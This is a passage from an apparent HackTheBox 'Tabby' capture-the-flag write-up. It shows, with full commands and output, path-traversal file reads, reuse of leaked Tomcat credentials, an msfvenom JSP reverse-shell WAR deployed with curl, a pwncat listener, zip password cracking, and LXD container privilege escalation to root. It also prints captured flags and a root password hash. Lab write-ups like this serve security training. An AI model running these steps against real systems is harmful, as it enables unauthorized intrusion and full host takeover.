</span></span></span><span style=display:flex><span><span style=color:#75715e>  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds
</span></span></span><span style=display:flex><span><span style=color:#75715e>  them. You will also need to set the passwords to something appropriate.
</span></span></span><span style=display:flex><span><span style=color:#75715e>--&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!--
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;role rolename=&#34;tomcat&#34;/&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;role rolename=&#34;role1&#34;/&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;user username=&#34;tomcat&#34; password=&#34;&lt;must-be-changed&gt;&#34; roles=&#34;tomcat&#34;/&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;user username=&#34;both&#34; password=&#34;&lt;must-be-changed&gt;&#34; roles=&#34;tomcat,role1&#34;/&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;user username=&#34;role1&#34; password=&#34;&lt;must-be-changed&gt;&#34; roles=&#34;role1&#34;/&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>--&gt;</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>&lt;role</span> <span style=color:#a6e22e>rolename=</span><span style=color:#e6db74>&#34;admin-gui&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>&lt;role</span> <span style=color:#a6e22e>rolename=</span><span style=color:#e6db74>&#34;manager-script&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>&lt;user</span> <span style=color:#a6e22e>username=</span><span style=color:#e6db74>&#34;tomcat&#34;</span> <span style=color:#a6e22e>password=</span><span style=color:#e6db74>&#34;$3cureP4s5w0rd123!&#34;</span> <span style=color:#a6e22e>roles=</span><span style=color:#e6db74>&#34;admin-gui,manager-script&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/tomcat-users&gt;</span>
</span></span></code></pre></div><p>We can connect with <code>tomcat</code> / <code>$3cureP4s5w0rd123!</code> to <a href=http://megahosting.htb:8080/manager/html>http://megahosting.htb:8080/manager/html</a></p><p>The manager interface seems to be enabled only on localhost but we may
upload files without it.</p><p>We can download <code>server.xml</code>
<a href="http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/server.xml">http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/server.xml</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>...
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;Host</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;localhost&#34;</span>  <span style=color:#a6e22e>appBase=</span><span style=color:#e6db74>&#34;webapps&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>unpackWARs=</span><span style=color:#e6db74>&#34;true&#34;</span> <span style=color:#a6e22e>autoDeploy=</span><span style=color:#e6db74>&#34;true&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>So it&rsquo;s accessible only from localhost but will unpack WARs and auto deploy
them.</p><p>By reading <code>web.xml</code> we can see that <code>.jsp</code> are allowed.</p><p>Now it&rsquo;s time to read documentation!</p><h2 id=http-exploitation-file-upload--rce>HTTP exploitation: File upload & RCE<a hidden class=anchor aria-hidden=true href=#http-exploitation-file-upload--rce>#</a></h2><p>Let&rsquo;s see the <a href=https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands>Supported Manager Commands</a>.</p><blockquote><p>All commands that the Manager application knows how to process are specified in a single request URI like this:</p><p><code>http://{host}:{port}/manager/text/{command}?{parameters}</code></p><p>where {host} and {port} represent the hostname and port number on which Tomcat is running, {command} represents the Manager command you wish to execute, and {parameters} represents the query parameters that are specific to that command. In the illustrations below, customize the host and port appropriately for your installation.</p><p>The commands are usually executed by HTTP GET requests. The /deploy command has a form that is executed by an HTTP PUT request.</p></blockquote><p>Then we can read <strong>Deploy A New Application Archive (WAR) Remotely</strong>.</p><blockquote><p><code>http://localhost:8080/manager/text/deploy?path=/foo</code></p><p>Upload the web application archive (WAR) file that is specified as the request data in this HTTP PUT request, install it into the appBase directory of our corresponding virtual host, and start, deriving the name for the WAR file added to the appBase from the specified path. The application can later be undeployed (and the corresponding WAR file removed) by use of the /undeploy command.</p><p>This command is executed by an HTTP PUT request.</p></blockquote><p>Let&rsquo;s craft a WAR reverse shell.</p><pre tabindex=0><code>$ msfvenom --list payloads | grep -i jsp
    java/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell

$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.49 LPORT=9999 -f war &gt; revshell.war
</code></pre><pre tabindex=0><code>$ curl -X PUT -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; -T revshell.war &#39;http://tabby.htb:8080/manager/text/deploy?path=/cyfun&#39;
OK - Deployed application at context path [/cyfun]
</code></pre><p>Now the <a href=http://megahosting.htb:8080/cyfun/>http://megahosting.htb:8080/cyfun/</a>.</p><p>Let&rsquo;s start a listener with <a href=https://pwncat.org/>pwncat</a>.</p><pre tabindex=0><code>$ pwncat -l 9999 -vv
INFO: Listening on :::9999 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
INFO: Client connected from 10.10.10.194:39776 (family 2/IPv4, TCP)
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
tomcat@tabby:/var/lib/tomcat9$
</code></pre><h2 id=system-enumeration>System enumeration<a hidden class=anchor aria-hidden=true href=#system-enumeration>#</a></h2><p>With <a href=https://github.com/carlospolop/PEASS-ng>linpeas</a> we can find a backup file:</p><pre tabindex=0><code>[+] Backup files?
-rw-r--r-- 1 ash ash 8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip
</code></pre><pre tabindex=0><code>tomcat@tabby:/var/www/html$ ls
ls
assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt
tomcat@tabby:/var/www/html$ ls -lhA files
ls -lhA files
total 28K
-rw-r--r-- 1 ash  ash  8.6K Jun 16 13:42 16162020_backup.zip
drwxr-xr-x 2 root root 4.0K Jun 16 20:13 archive
drwxr-xr-x 2 root root 4.0K Jun 16 20:13 revoked_certs
-rw-r--r-- 1 root root 6.4K Jun 16 11:25 statement
</code></pre><p>It password protected, lets&rsquo; crack it with <code>fcrackzip</code>:</p><pre tabindex=0><code>$ fcrackzip -D -p /usr/share/wordlists/password/rockyou.txt files/16162020_backup.zip
possible pw found: admin@it ()

$ unzip 16162020_backup.zip
Archive:  16162020_backup.zip
   creating: var/www/html/assets/
[16162020_backup.zip] var/www/html/favicon.ico password:
  inflating: var/www/html/favicon.ico
   creating: var/www/html/files/
  inflating: var/www/html/index.php
 extracting: var/www/html/logo.png
  inflating: var/www/html/news.php
  inflating: var/www/html/Readme.txt
</code></pre><h2 id=privilege-escalation-of-machine--tomcat-to-ash>Privilege Escalation of Machine : tomcat to ash<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--tomcat-to-ash>#</a></h2><p>Since the backup file was owned by ash we can try to re-use the archive password
for ash account:</p><pre tabindex=0><code>tomcat@tabby:/var/lib/tomcat9$ su ash
Password: admin@it

ash@tabby:/var/lib/tomcat9$

ash@tabby:~$ cat user.txt
13a5665425216a6a5a14fbd8aab23b93
</code></pre><h2 id=privilege-escalation-of-machine--ash-to-root>Privilege Escalation of Machine : ash to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--ash-to-root>#</a></h2><p>ash is in adm and lxd groups:</p><pre tabindex=0><code>ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
</code></pre><p><a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation>lxc - Privilege escalation</a></p><p>Prepare distrobuilder:</p><pre tabindex=0><code>$ sudo pacman -S go debootstrap rsync gnupg squashfs-tools git --needed
$ go get -d -v github.com/lxc/distrobuilder/distrobuilder
$ cd $HOME/go/src/github.com/lxc/distrobuilder
$ make
$ cd
</code></pre><p>Prepare and build an image:</p><pre tabindex=0><code>$ mkdir -p $HOME/ContainerImages/alpine/
$ cd $HOME/ContainerImages/alpine/
$ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
$ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml

# or

$ mkdir -p $HOME/ContainerImages/voidlinux/
$ cd $HOME/ContainerImages/voidlinux/
$ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/voidlinux.yaml
$ sudo $HOME/go/bin/distrobuilder build-lxd voidlinux.yaml
</code></pre><p>Then, upload to the server the files <code>lxd.tar.xz</code> and <code>rootfs.squashfs</code>:</p><pre tabindex=0><code>$ ruby -run -e httpd . -p 8888
[2020-08-09 15:40:46] INFO  WEBrick 1.6.0
[2020-08-09 15:40:46] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]
[2020-08-09 15:40:46] INFO  WEBrick::HTTPServer#start: pid=43919 port=8888
</code></pre><p>Then on the target download & add the image:</p><pre tabindex=0><code>$ wget http://10.10.14.76:8888/lxd.tar.xz
$ wget http://10.10.14.76:8888/rootfs.squashfs
$ lxc image import lxd.tar.xz rootfs.squashfs --alias voidlinux
$ lxc image list
</code></pre><p>Create a container and add root path:</p><pre tabindex=0><code>$ lxc init voidlinux cyfun -c security.privileged=true
$ lxc list
$ lxc config device add cyfun host-root disk source=/ path=/mnt/root recursive=true
</code></pre><p>Execute the container:</p><pre tabindex=0><code>$ lxc start cyfun
$ lxc exec cyfun /bin/sh
$ cd /mnt/root
</code></pre><p>Loot:</p><pre tabindex=0><code># cat /mnt/root/root/root.txt
3b89a121fa4338f7835fedb1f62b8cdc
# cat /mnt/root/etc/shadow | grep root
root:$6$86Nxy4plrFeu0w4C$IfFB5j7BEbjBrUOtkmxyfUZ0lnNIxAcFn3meuvjGqFPSIogXynKx9FU1w3XJIC60rvwuKcg6feaeBqcNWMO0H/:18429:0:99999:7:::
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/buff/><span class=title>« Prev</span><br><span>Buff </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/dyplesher/><span class=title>Next »</span><br><span>Dyplesher</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>